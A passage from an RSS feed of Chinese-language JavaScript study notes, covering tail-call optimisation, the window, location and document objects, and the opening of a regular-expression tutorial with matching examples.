<span>let</span> p <span>=</span> <span>new</span> <span>(</span><span>class</span> <span>Foo</span> <span>{</span>
  <span>constructor</span><span>(</span><span>x</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>x<span>)</span>
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>'bar'</span><span>)</span> <span>// bar</span>

console<span>.</span><span>log</span><span>(</span>p<span>)</span> <span>// Foo {}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<p>继承。</p>
<blockquote>
<p>很多 JavaScript 框架（特别是 React）已经抛弃混入模式，转向了组合模式（把方法提取到独立的类和辅助对象中，然后把它们组合起来，但不使用继承）。这反映了那个众所周知的软件设计原则：“组合胜过继承（composition over inheritance）。”这个设计原则被很多人遵循，在代码设计中能提供极大的灵活性。</p>
</blockquote>
</li>
</ul>
<h2 id="_16-尾调用优化"> 16. 尾调用优化</h2>
<ul>
<li>ECMAScript 6 规范新增了一项内存管理优化机制，让 JavaScript 引擎在满足条件时可以重用栈帧。具体来说，这项优化非常适合 “尾调用”，即外部函数的返回值是一个内部函数的返回值。</li>
</ul>
<div><pre><code><span>function</span> <span>outerFunction</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>innerFunction</span><span>(</span><span>)</span> <span>// 尾调用</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>
<p>在 ES6 优化之前，执行这个例子会在内存中发生如下操作。</p>
<ol>
<li>执行到 outerFunction 函数体，第一个栈帧被推到栈上。</li>
<li>执行 outerFunction 函数体，到 return 语句。计算返回值必须先计算 innerFunction。</li>
<li>执行到 innerFunction 函数体，第二个栈帧被推到栈上。</li>
<li>执行 innerFunction 函数体，计算其返回值。</li>
<li>将返回值传回 outerFunction ，然后 outerFunction 再返回值。</li>
<li>将栈帧弹出栈外。</li>
</ol>
</li>
<li>
<p>在 ES6 优化之后，执行这个例子会在内存中发生如下操作。</p>
<ol>
<li>执行到 outerFunction 函数体，第一个栈帧被推到栈上。</li>
<li>执行 outerFunction 函数体，到达 return 语句。为求值返回语句，必须先求值 innerFunction。</li>
<li>引擎发现把第一个栈帧弹出栈外也没问题，因为 innerFunction 的返回值也是 outerFunction 的返回值。</li>
<li>弹出 outerFunction 的栈帧。</li>
<li>执行到 innerFunction 函数体，栈帧被推到栈上。</li>
<li>执行 innerFunction 函数体，计算其返回值。</li>
<li>将 innerFunction 的栈帧弹出栈外。</li>
</ol>
</li>
<li>
<p>现在还没有办法测试尾调用优化是否起作用。不过，因为这是 ES6 规范所规定的，兼容的浏览器实现都能保证在代码满足条件的情况下应用这个优化。</p>
</li>
<li>
<p>尾调用优化的条件。</p>
<ol>
<li>代码在严格模式下执行。</li>
<li>外部函数的返回值是对尾调用函数的调用。</li>
<li>尾调用函数返回后不需要执行额外的逻辑。</li>
<li>尾调用函数不是引用外部函数作用域中自由变量的闭包。</li>
</ol>
<div><pre><code><span>'use strict'</span>
<span>// 无优化：尾调用没有返回</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>)</span> <span>{</span>
  <span>innerFunction</span><span>(</span><span>)</span>
<span>}</span>
<span>// 无优化：尾调用没有直接返回</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> innerFunctionResult <span>=</span> <span>innerFunction</span><span>(</span><span>)</span>
  <span>return</span> innerFunctionResult
<span>}</span>
<span>// 无优化：尾调用返回后必须转型为字符串</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>innerFunction</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span>
<span>}</span>
<span>// 无优化：尾调用是一个闭包</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> foo <span>=</span> <span>'bar'</span>
  <span>function</span> <span>innerFunction</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> foo
  <span>}</span>
  <span>return</span> <span>innerFunction</span><span>(</span><span>)</span>
<span>}</span>

<span>// 有优化：栈帧销毁前执行参数计算</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
  <span>return</span> <span>innerFunction</span><span>(</span>a <span>+</span> b<span>)</span>
<span>}</span>
<span>// 有优化：初始返回值不涉及栈帧</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>a <span>&lt;</span> b<span>)</span> <span>{</span>
    <span>return</span> a
  <span>}</span>
  <span>return</span> <span>innerFunction</span><span>(</span>a <span>+</span> b<span>)</span>
<span>}</span>
<span>// 有优化：两个内部函数都在尾部</span>
<span>function</span> <span>outerFunction</span><span>(</span><span>condition</span><span>)</span> <span>{</span>
  <span>return</span> condition <span>?</span> <span>innerFunctionA</span><span>(</span><span>)</span> <span>:</span> <span>innerFunctionB</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div></li>
<li>
<p>之所以要求严格模式，主要因为在非严格模式下函数调用中允许使用 f.arguments 和 f.caller ，而它们都会引用外部函数的栈帧。显然，这意味着不能应用优化了。因此尾调用优化要求必须在严格模式下有效，以防止引用这些属性。</p>
</li>
</ul>
<h2 id="_17-window-对象"> 17. window 对象</h2>
<ul>
<li>
<p>窗口关系。</p>
<blockquote>
<ul>
<li>top 对象始终指向最上层（最外层）窗口，即浏览器窗口本身。而 parent 对象则始终指向当前窗口的父窗口。如果当前窗口是最上层窗口，则 parent 等于 top （都等于 window ）。最上层的 window 如果不是通过 window.open() 打开的，那么其 name 属性就不会包含值。</li>
<li>还有一个 self 对象，它是终极 window 属性，始终会指向 window。实际上， self 和 window 就是同一个对象。之所以还要暴露 self ，就是为了和 top 、 parent 保持一致。</li>
</ul>
</blockquote>
</li>
<li>
<p>窗口位置与像素比。</p>
<blockquote>
<p>window.devicePixelRatio 实际上与每英寸像素数（DPI，dots per inch）是对应的。DPI 表示单位像素密度，而 window.devicePixelRatio 表示物理像素与逻辑像素之间的缩放系数。</p>
</blockquote>
</li>
<li>
<p>视口位置。</p>
<blockquote>
<p>scroll()、scrollTo() 和 scrollBy() 都接收一个 ScrollToOptions 字典，除了提供偏移值，还可以通过 behavior 属性告诉浏览器是否平滑滚动。</p>
</blockquote>
<div><pre><code><span>// 正常滚动</span>
window<span>.</span><span>scrollTo</span><span>(</span><span>{</span>
  <span>left</span><span>:</span> <span>100</span><span>,</span>
  <span>top</span><span>:</span> <span>100</span><span>,</span>
  <span>behavior</span><span>:</span> <span>'auto'</span><span>,</span>
<span>}</span><span>)</span>

<span>// 平滑滚动</span>
window<span>.</span><span>scrollTo</span><span>(</span><span>{</span>
  <span>left</span><span>:</span> <span>100</span><span>,</span>
  <span>top</span><span>:</span> <span>100</span><span>,</span>
  <span>behavior</span><span>:</span> <span>'smooth'</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p>导航与打开新窗口。</p>
<ul>
<li>
<p>弹出窗口。</p>
<blockquote>
<ul>
<li>window.open() 方法可以用于导航到指定 URL，也可以用于打开新浏览器窗口。这个方法接收 4 个参数：要加载的 URL、目标窗口、特性字符串和表示新窗口在浏览器历史记录中是否替代当前加载页面的布尔值。通常，调用这个方法时只传前 3 个参数，最后一个参数只有在不打开新窗口时才会使用。</li>
<li>如果 window.open() 的第二个参数是一个已经存在的窗口或窗格（frame）的名字，则会在对应的窗口或窗格中打开 URL。第二个参数也可以是一个特殊的窗口名，比如 _self、_parent、_top 或 _blank。</li>
<li>如果 window.open() 的第二个参数不是已有窗口，则会打开一个新窗口或标签页。第三个参数，即特性字符串，用于指定新窗口的配置。如果没有传第三个参数，则新窗口（或标签页）会带有所有默认的浏览器特性（工具栏、地址栏、状态栏等都是默认配置）。如果打开的不是新窗口，则忽略第三个参数。<a href="https://www.w3school.com.cn/htmldom/met_win_open.asp#windowfeatures" target="_blank" rel="noopener noreferrer">Features</a></li>
</ul>
</blockquote>
<div><pre><code>window<span>.</span><span>open</span><span>(</span>
  <span>'https://www.coderljw.ga/'</span><span>,</span>
  <span>'matrix'</span><span>,</span>
  <span>'height=777,width=777,top=77,left=77,resizable=yes'</span>
<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><blockquote>
<ul>
<li>还可以使用 close() 方法像这样关闭新打开的窗口。这个方法只能用于 window.open() 创建的弹出窗口。虽然不可能不经用户确认就关闭主窗口，但弹出窗口可以调用 top.close() 来关闭自己。关闭窗口以后，窗口的引用虽然还在，但只能用于检查其 closed 属性了。</li>
<li>新创建窗口的 window 对象有一个属性 opener，指向打开它的窗口。这个属性只在弹出窗口的最上层 window 对象（ top ）有定义，是指向调用 window.open() 打开它的窗口或窗格的指针。</li>
</ul>
</blockquote>
<div><pre><code><span>let</span> matrix <span>=</span> window<span>.</span><span>open</span><span>(</span>
  <span>'https://www.coderljw.ga/'</span><span>,</span>
  <span>'matrix'</span><span>,</span>
  <span>'height=400,width=400,top=10,left=10,resizable=yes'</span>
<span>)</span>

console<span>.</span><span>log</span><span>(</span>matrix<span>.</span>opener <span>===</span> window<span>)</span> <span>// true</span>

matrix<span>.</span><span>close</span><span>(</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>matrix<span>.</span>closed<span>)</span> <span>// true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><blockquote>
<p>在某些浏览器中，每个标签页会运行在独立的进程中。如果一个标签页打开了另一个，而 window 对象需要跟另一个标签页通信，那么标签便不能运行在独立的进程中。在这些浏览器中，可以将新打开的标签页的 opener 属性设置为 null，表示新打开的标签页可以运行在独立的进程中。把 opener 设置为 null 表示新打开的标签页不需要与打开它的标签页通信，因此可以在独立进程中运行。这个连接一旦切断，就无法恢复了。</p>
</blockquote>
</li>
<li>
<p>安全限制。</p>
<blockquote>
<ul>
<li>弹出窗口有段时间被在线广告用滥了。很多在线广告会把弹出窗口伪装成系统对话框，诱导用户点击。因为长得像系统对话框，所以用户很难分清这些弹窗的来源。为了让用户能够区分清楚，浏览器开始对弹窗施加限制。</li>
<li>此外，浏览器会在用户操作下才允许创建弹窗。在网页加载过程中调用 window.open() 没有效果，而且还可能导致向用户显示错误。弹窗通常可能在鼠标点击或按下键盘中某个键的情况下才能打开。</li>
</ul>
</blockquote>
</li>
<li>
<p>弹窗屏蔽程序。</p>
<blockquote>
<ul>
<li>所有现代浏览器都内置了屏蔽弹窗的程序，因此大多数意料之外的弹窗都会被屏蔽。在浏览器屏蔽弹窗时，可能会发生一些事。如果浏览器内置的弹窗屏蔽程序阻止了弹窗，那么 window.open() 很可能会返回 null。此时，只要检查这个方法的返回值就可以知道弹窗是否被屏蔽了。</li>
<li>在浏览器扩展或其他程序屏蔽弹窗时， window.open() 通常会抛出错误。因此要准确检测弹窗是否被屏蔽，除了检测 window.open() 的返回值，还要把它用 try / catch 包装起来。</li>
</ul>
</blockquote>
<div><pre><code><span>try</span> <span>{</span>
  <span>let</span> matrix <span>=</span> window<span>.</span><span>open</span><span>(</span><span>'https://www.coderljw.ga/'</span><span>,</span> <span>'_blank'</span><span>)</span>
<span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'The popup was blocked!'</span><span>)</span>
<span>}</span>

<span>if</span> <span>(</span>matrix <span>==</span> <span>null</span><span>)</span> console<span>.</span><span>log</span><span>(</span><span>'The popup was blocked!'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
</ul>
</li>
<li>
<p>定时器。</p>
<blockquote>
<ul>
<li>调用 setTimeout() 时，会返回一个表示该超时排期的数值 ID。这个超时 ID 是被排期执行代码的唯一标识符，可用于取消该任务。要取消等待中的排期任务，可以调用 clearTimeout() 方法并传入超时 ID。</li>
<li>所有超时执行的代码（函数）都会在全局作用域中的一个匿名函数中运行，因此函数中的 this 值在非严格模式下始终指向 window，而在严格模式下是 undefined。如果给 setTimeout() 提供了一个箭头函数，那么 this 会保留为定义它时所在的词汇作用域。</li>
<li><code>setInterval(() =&gt; alert(&quot;Hello world!&quot;), 10000)</code> 这里的关键点是，第二个参数，也就是间隔时间，指的是向队列添加新任务之前等待的时间。比如，调用 setInterval() 的时间为 01:00:00，间隔时间为 3000 毫秒。这意味着 01:00:03 时，浏览器会把任务添加到执行队列。浏览器不关心这个任务什么时候执行或者执行要花多长时间。因此，到了 01:00:06，它会再向队列中添加一个任务。由此可看出，执行时间短、非阻塞的回调函数比较适合 setInterval()。</li>
</ul>
</blockquote>
<div><pre><code><span>let</span> num <span>=</span> <span>0</span>
<span>let</span> max <span>=</span> <span>10</span>
<span>let</span> <span>incrementNumber</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  num<span>++</span>
  <span>//  如果还没有达到最大值，再设置一个超时任务</span>
  <span>if</span> <span>(</span>num <span>&lt;</span> max<span>)</span> <span>{</span>
    <span>setTimeout</span><span>(</span>incrementNumber<span>,</span> <span>500</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>alert</span><span>(</span><span>'Done'</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>setTimeout</span><span>(</span>incrementNumber<span>,</span> <span>500</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><blockquote>
<p>注意在使用 setTimeout() 时，不一定要记录超时 ID，因为它会在条件满足时自动停止，否则会自动设置另一个超时任务。这个模式是设置循环任务的推荐做法。 setIntervale() 在实践中很少会在生产环境下使用，因为一个任务结束和下一个任务开始之间的时间间隔是无法保证的，有些循环定时任务可能会因此而被跳过。而像前面这个例子中一样使用 setTimeout() 则能确保不会出现这种情况。一般来说，最好不要使用 setInterval()。</p>
</blockquote>
</li>
</ul>
<h2 id="_18-location-对象"> 18. location 对象</h2>
<ul>
<li>
<p>location 是最有用的 BOM 对象之一，提供了当前窗口中加载文档的信息，以及通常的导航功能。这个对象独特的地方在于，它既是 window 的属性，也是 document 的属性。也就是说，window.location 和 document.location 指向同一个对象。location 对象不仅保存着当前加载文档的信息，也保存着把 URL 解析为离散片段后能够通过属性访问的信息。</p>
</li>
<li>
<p>查询字符串。</p>
<blockquote>
<p>URLSearchParams 提供了一组标准 API 方法，通过它们可以检查和修改查询字符串。给 URLSearchParams 构造函数传入一个查询字符串，就可以创建一个实例。这个实例上暴露了 get()、set() 和 delete() 等方法，可以对查询字符串执行相应操作。大多数支持 URLSearchParams 的浏览器也支持将 URLSearchParams 的实例用作可迭代对象。</p>
</blockquote>
<div><pre><code><span>let</span> qs <span>=</span> <span>'?q=javascript&amp;num=10'</span>
<span>let</span> searchParams <span>=</span> <span>new</span> <span>URLSearchParams</span><span>(</span>qs<span>)</span>

<span>alert</span><span>(</span>searchParams<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span> <span>// " q=javascript&amp;num=10"</span>
searchParams<span>.</span><span>has</span><span>(</span><span>'num'</span><span>)</span> <span>// true</span>
searchParams<span>.</span><span>get</span><span>(</span><span>'num'</span><span>)</span> <span>// 10</span>

searchParams<span>.</span><span>set</span><span>(</span><span>'page'</span><span>,</span> <span>'3'</span><span>)</span>
<span>alert</span><span>(</span>searchParams<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span> <span>// " q=javascript&amp;num=10&amp;page=3"</span>

searchParams<span>.</span><span>delete</span><span>(</span><span>'q'</span><span>)</span>
<span>alert</span><span>(</span>searchParams<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span> <span>// " num=10&amp;page=3"</span>

<span>for</span> <span>(</span><span>let</span> param <span>of</span> searchParams<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>param<span>)</span>
<span>}</span>
<span>// ["q", "javascript"]</span>
<span>// ["num", "10"]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<p>操作地址。</p>
<blockquote>
<p>最后一个修改地址的方法是 reload() ，它能重新加载当前显示的页面。调用 reload() 而不传参数，页面会以最有效的方式重新加载。也就是说，如果页面自上次请求以来没有修改过，浏览器可能会从缓存中加载页面。如果想强制从服务器重新加载，可以像下面这样给 reload() 传个 true。</p>
</blockquote>
<div><pre><code>location<span>.</span><span>reload</span><span>(</span><span>)</span> <span>// 重新加载，可能是从缓存加载</span>
location<span>.</span><span>reload</span><span>(</span><span>true</span><span>)</span> <span>// 重新加载，从服务器加载</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><blockquote>
<p>脚本中位于 reload() 调用之后的代码可能执行也可能不执行，这取决于网络延迟和系统资源等因素。为此，最好把 reload() 作为最后一行代码。</p>
</blockquote>
</li>
</ul>
<h2 id="_19-document-类型"> 19. Document 类型</h2>
<ul>
<li>
<p>Document 类型是 JavaScript 中表示文档节点的类型。在浏览器中，文档对象 document 是 HTMLDocument 的实例（ HTMLDocument 继承 Document ），表示整个 HTML 页面。 document 是 window 对象的属性，因此是一个全局对象。</p>
</li>
<li>
<p>document 作为 HTMLDocument 的实例，还有一些标准 Document 对象上所没有的属性。这些属性提供浏览器所加载网页的信息。其中第一个属性是 title，包含 <code>&lt;title&gt;</code> 元素中的文本，通常显示在浏览器窗口或标签页的标题栏。通过这个属性可以读写页面的标题，修改后的标题也会反映在浏览器标题栏上。不过，修改 title 属性并不会改变 <code>&lt;title&gt;</code> 元素。</p>
</li>
<li>
<p>特殊集合。</p>
<blockquote>
<ul>
<li>document.anchors 包含文档中所有带 name 属性的 <code>&lt;a&gt;</code> 元素。</li>
<li>document.forms 包含文档中所有 <code>&lt;form&gt;</code> 元素（与 document.getElementsByTagName (&quot;form&quot;)返回的结果相同）。</li>
<li>document.images 包含文档中所有 <code>&lt;img&gt;</code> 元素（与 document.getElementsByTagName (&quot;img&quot;)返回的结果相同）。</li>
<li>document.links 包含文档中所有带 href 属性的 <code>&lt;a&gt;</code> 元素。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="待续"> 待续...</h2>
]]></content:encoded>
    </item>
    <item>
      <title>JavaScript 正则表达式迷你书（1.1版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-RegExp/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-RegExp/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 正则表达式迷你书（1.1版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-两种模糊匹配"> 1. 两种模糊匹配</h2>
<ul>
<li>
<p>横向模糊匹配。</p>
<blockquote>
<ul>
<li>横向模糊指的是，一个正则可匹配的字符串的长度不是固定的，可以是多种情况的。</li>
<li>其实现的方式是使用量词。譬如 {m,n}，表示连续出现最少 m 次，最多 n 次。</li>
</ul>
</blockquote>
</li>
<li>
<p>纵向模糊匹配。</p>
<blockquote>
<ul>
<li>纵向模糊指的是，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符，可以有多种可能。</li>
<li>其实现的方式是使用字符组。譬如 [abc]，表示该字符是可以字符 &quot;a&quot;、&quot;b&quot;、&quot;c&quot; 中的任何一个。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_2-字符组"> 2. 字符组</h2>
<ul>
<li>
<p>范围表示法。</p>
<blockquote>
<ul>
<li>因为连字符有特殊用途，那么要匹配 &quot;a&quot;、&quot;-&quot;、&quot;z&quot; 这三者中任意一个字符，该怎么做呢？</li>
<li>可以写成如下的方式：[-az] 或 [az-] 或 [a-z]。</li>
<li>即要么放在开头，要么放在结尾，要么转义。</li>
</ul>
</blockquote>
</li>
<li>
<p>常见的简写形式。</p>
<blockquote>
<p>如果要匹配任意字符怎么办？可以使用 [\d\D]、[\w\W]、[\s\S] 和 [^] 中任何的一个。</p>
</blockquote>
</li>
</ul>
<h2 id="_3-量词"> 3. 量词</h2>
<ul>
<li>
<p>贪婪匹配与惰性匹配。</p>
<blockquote>
<p>通过在量词后面加个问号就能实现惰性匹配。</p>
</blockquote>
<div><pre><code><span>// 贪婪匹配</span>
<span>var</span> regex <span>=</span> <span><span>/</span><span>\d{2,5}</span><span>/</span><span>g</span></span>
<span>var</span> string <span>=</span> <span>'123 1234 12345 123456'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>)</span>
<span>// => ["123", "1234", "12345", "12345"]</span>

<span>// 惰性匹配</span>
<span>var</span> regex <span>=</span> <span><span>/</span><span>\d{2,5}?</span><span>/</span><span>g</span></span>
<span>var</span> string <span>=</span> <span>'123 1234 12345 123456'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>)</span>
<span>// => ["12", "12", "34", "12", "34", "12", "34", "56"]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
</ul>
<h2 id="_4-正则表达式字符匹配攻略-案例分析"> 4. 正则表达式字符匹配攻略 - 案例分析</h2>
<ul>
<li>
<p>匹配 16 进制颜色值。</p>
<blockquote>
<ul>
<li>要求匹配：#ffbbad、#Fc01DF、#FFF、#ffE。</li>
<li>分析：表示一个 16 进制字符，可以用字符组 [0-9a-fA-F]。其中字符可以出现 3 或 6 次，需要是用量词和分支结构。使用分支结构时，需要注意顺序。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})</span><span>/</span><span>g</span></span>
<span>var</span> string <span>=</span> <span>'#ffbbad #Fc01DF #FFF #ffE'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>)</span>
<span>// => ["#ffbbad", "#Fc01DF", "#FFF", "#ffE"]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<p>匹配时间。</p>
<blockquote>
<ul>
<li>要求匹配：23:59、02:07。</li>
<li>分析：共 4 位数字，第一位数字可以为 [0-2]。当第 1 位为 &quot;2&quot; 时，第 2 位可以为 [0-3]，其他情况时，第 2 位为 [0-9]。第 3 位数字为 [0-5]，第 4 位为 [0-9]。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>^([01][0-9]|[2][0-3]):[0-5][0-9]$</span><span>/</span></span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'23:59'</span><span>)</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'02:07'</span><span>)</span><span>)</span>
<span>// => true</span>
<span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>匹配日期。</p>
<blockquote>
<ul>
<li>要求匹配：2017-06-10。</li>
<li>分析：年，四位数字即可，可用 [0-9]{4}。月，共 12 个月，分两种情况 &quot;01&quot;、&quot;02&quot;、…、&quot;09&quot; 和 &quot;10&quot;、&quot;11&quot;、&quot;12&quot;，可用 (0[1-9]|1[0-2])。日，最大 31 天，可用 (0[1-9]|[12][0-9]|3[01])。</li>
</ul>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$</span><span>/</span></span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'2017-06-10'</span><span>)</span><span>)</span>
<span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>window 操作系统文件路径。</p>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>^[a-zA-Z]:\\([^\\:*&lt;>|"?\r\n/]+\\)*([^\\:*&lt;>|"?\r\n/]+)?$</span><span>/</span></span>
console<span>.</span><span>log</span><span>(</span>
  regex<span>.</span><span>test</span><span>(</span><span>'F:\\study\\javascript\\regex\\regular expression.pdf'</span><span>)</span>
<span>)</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'F:\\study\\javascript\\regex\\'</span><span>)</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'F:\\study\\javascript'</span><span>)</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>regex<span>.</span><span>test</span><span>(</span><span>'F:\\'</span><span>)</span><span>)</span>
<span>// => true</span>
<span>// => true</span>
<span>// => true</span>
<span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<p>匹配 id。</p>
<blockquote>
<p>惰性匹配会有回溯问题，效率比较低。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>id=".*?"</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'&lt;div id="container">&lt;/div>'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>[</span><span>0</span><span>]</span><span>)</span>
<span>// => id="container"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><blockquote>
<p>优化。</p>
</blockquote>
<div><pre><code><span>var</span> regex <span>=</span> <span><span>/</span><span>id="[^"]*"</span><span>/</span></span>
<span>var</span> string <span>=</span> <span>'&lt;div id="container">&lt;/div>'</span>
console<span>.</span><span>log</span><span>(</span>string<span>.</span><span>match</span><span>(</span>regex<span>)</span><span>[</span><span>0</span><span>]</span><span>)</span>
<span>// => id="container"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
</ul>
<h2 id="_5-如何匹配位置呢"> 5. 如何匹配位置呢？</h2>
<ul>
<li>
<p>^（脱字符）匹配开头，在多行匹配中匹配行开头。$（美元符号）匹配结尾，在多行匹配中匹配行结尾。</p>
<div><pre><code><span>var</span> result <span>=</span> <span>'hello'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^|$</span><span>/</span><span>g</span></span><span>,</span> <span>'#'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "#hello#"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>\b 是单词边界，具体就是 \w 与 \W 之间的位置，也包括 \w 与 ^ 之间的位置，和 \w 与 $ 之间的位置。</p>
<div><pre><code><span>var</span> result <span>=</span> <span>'[JS] Lesson_01.mp4'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\b</span><span>/</span><span>g</span></span><span>,</span> <span>'#'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "[#JS#] #Lesson_01#.#mp4#"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>\B 就是 \b 的反面的意思，非单词边界。例如在字符串中所有位置中，扣掉 \b，剩下的都是 \B 的。具体说来就是 \w 与 \w、 \W 与 \W、^ 与 \W，\W 与 $ 之间的位置。</p>
<div><pre><code><span>var</span> result <span>=</span> <span>'[JS] Lesson_01.mp4'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\B</span><span>/</span><span>g</span></span><span>,</span> <span>'#'</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "#[J#S]# L#e#s#s#o#n#_#0#1.m#p#4"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>(?=p)，其中 p 是一个子模式，即 p 前面的位置，或者说，该位置后面的字符要匹配 p。</p>
<div><pre><code><span>var</span> result <span>=</span> <span>'hello'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?=l)</span><span>/</span><span>g</span></span><span>,</span> <span>'#'</span><span>)</span>
